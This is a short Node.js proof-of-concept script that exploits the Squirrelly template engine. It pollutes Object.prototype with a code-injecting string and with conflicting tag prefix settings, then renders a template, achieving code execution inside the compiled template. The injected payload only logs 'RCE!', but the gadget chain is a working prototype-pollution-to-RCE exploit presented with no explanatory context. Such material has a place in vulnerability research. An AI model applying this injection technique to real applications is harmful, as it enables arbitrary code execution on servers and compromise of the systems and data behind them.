var sqrl = require('squirrelly')
const path = require('path')


templatePath = path.join(__dirname+'/views/', 'each.sqrl');

// chained gadgets!
Object.prototype.n = "useScope');console.log('RCE!');return tR;}}, params:[it.kids]})\n//";
// Object.prototype.settings = {
//    'view options':{
//       prefixes: {
//          h: '@',
//          s: "val", // conflict! 
//          b: 'val',
//          i: '',
//          r: '*',
//          c: '/',
//          e: '!',
//      }
//    }
// };

Object.prototype.settings = {
   'view options':{
      prefixes: {
         h: '@',
         s: "#", // conflict! 
         b: '#',
         i: '',
         r: '*',
         c: '/',
         e: '!',
     }
   }
};

sqrl.renderFile(templatePath, { kids: ['Ben', 'Polly', 'Joel', 'Phronsie', 'Davie'] });
